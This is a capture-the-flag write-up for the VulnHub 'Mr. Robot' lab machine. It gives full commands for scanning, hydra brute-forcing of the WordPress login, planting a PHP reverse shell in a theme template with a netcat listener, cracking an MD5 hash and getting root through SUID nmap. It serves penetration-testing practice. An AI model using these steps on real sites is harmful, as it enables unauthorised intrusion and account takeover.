# Write-Up

# VulnHub: Mr. Robot

# Enumeration

I scanned my network using netdiscover to find the IP of the machine.

```
#netdiscover - r 192.168.100.0/
```
![1](images/1.png)
Looking at that list, i found that the ip is 192.168.100.

After finding the IP, i ran nmap to gather some infos regarding the ports and
running services

```
#nmap -sV 192.168.100.1 73
```
![2](images/2.png)

After that, I ran dirsearch to list out the potential hidden directories. I exclude
code 404 and 403 using -x to reduce unnecesary results.

```
#dirsearch -x 404,403 -u 192.168.100.
```

While waiting dirsearch to finish, i tried to find some common directories
manually.
![3](images/3.png)

I found out that the page is running wordpress, and i found something
interesting on robots.txt
![4](images/4.png)

I tried accessing key- 1 - of-3.txt and it gave me the first part of the flag

```
073403c8a58a1f80d943455fb30724b
```
![5](images/5.png)

The other interesting found which is fsocity.dic turns out to be a wordlist. After
checking it, I found that it has multiple duplicate entries which is redundant and
makes bruteforcing longer, so I decided to fix it.

```
#sort fsocity.dic | uniq > fsocity.uniq
```
At this point, the dirsearch are finished and its confirming my found that the
page is running wordpress
![6](images/6.png)

## Bruteforcing
![7](images/7.png)
I went to the admin login page, and after failing some random common defaults
user-password trials, I decided to bruteforce it using hydra and using the
wordlist I found from robots.txt

To start a bruteforce using hydra, i have to check first what are the parameters
from the form are named.
![8](images/8.png)

As for the hydra, here’s the command. A bit of explanation: -f is used so when
the right username is found, the hydra will exit. -vV is for verbose to show the
attempted passwords/username.

```
#hydra -L fsocity.uniq -p test123 -f -vV 192.168.100.173 http-post-form “/wp-
login.php:log=^USER&pwd=^PASS^&wp-submit=Log+In:F=Username invalid”
```
![9](images/9.png)

After running for about 5 minutes, i found a valid username which is elliot. Now
im gonna try to enumerate the password using that username.

```
#hydra -l elliot -P fsocity.uniq -f -vV 192.168.100.173 http-post-form “/wp-
login.php:log=^USER&pwd=^PASS^&wp-submit=Log+In:F=Username invalid”
```
![10](images/10.png)

Password found, now time to login into the admin dashboard.

## Gaining reverse shell

Im gonna edit the 404.php template to make it a php reverse shell using one of
the script from /usr/share/webshells.
![11](images/11.png)
![12](images/12.png)

Don’t forget to change the ip and port to the listening maching.

Before calling the reverse shell, don’t forget to set up a listener, here iam using
netcat

```
#nc -lnvp 4444
```
![13](images/13.png)
And we got a shell.

Here im gonna upgrade the shell using python so we can get the more
interactive one using

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
![14](images/14.png)

## Privesc: robot

After looking around I found a user named robot and inside I found the second
flag which apparently only accessible to robot and a password hashed with md5.
![15](images/15.png)

I went to a hash cracker online and cracked the password
![16](images/16.png)

I tried to login to the user robot using that password, and apparently i succeeded
and able to retrieve the second flag
![17](images/17.png)

## Privesc: root

After goofing around for a while, i found that nmap has a set SUID.
![18](images/18.png)

```
#find / -perm -u=s -type f 2>/dev/null
```

I went to gtfobins but i don’t find a way to privesc using the provided
exploitation, so i search somewhere else and found about the option nmap has
which is ‘ _--interactive_ ’ which can give me a prolonged shell as root provided the
SUID bit are set.

```
#nmap --interactive
#!sh
```
![19](images/19.png)
![20](images/20.png)
Flag 3 retrieved, machine pwned!


